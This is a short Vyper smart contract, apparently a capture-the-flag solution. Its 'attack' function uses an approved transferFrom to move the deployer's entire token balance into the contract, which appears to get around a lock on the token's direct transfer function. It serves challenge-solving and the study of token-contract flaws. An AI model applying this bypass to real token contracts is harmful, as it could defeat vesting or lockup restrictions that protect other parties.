# @version ^0.3.7

from vyper.interfaces import ERC20 as IERC20

owner: immutable(address)

instance: address

@external
@payable
def __init__(_instance: address):
    owner = msg.sender
    self.instance = _instance

@external
def attack():
    assert msg.sender == owner, "!owner"
    amount: uint256 = IERC20(self.instance).balanceOf(msg.sender)
    assert IERC20(self.instance).allowance(msg.sender, self) == amount, "!approved"

    IERC20(self.instance).transferFrom(msg.sender, self, amount)
    assert IERC20(self.instance).balanceOf(msg.sender) == 0, "bal !0"
    assert IERC20(self.instance).balanceOf(self) == amount, "!amount"
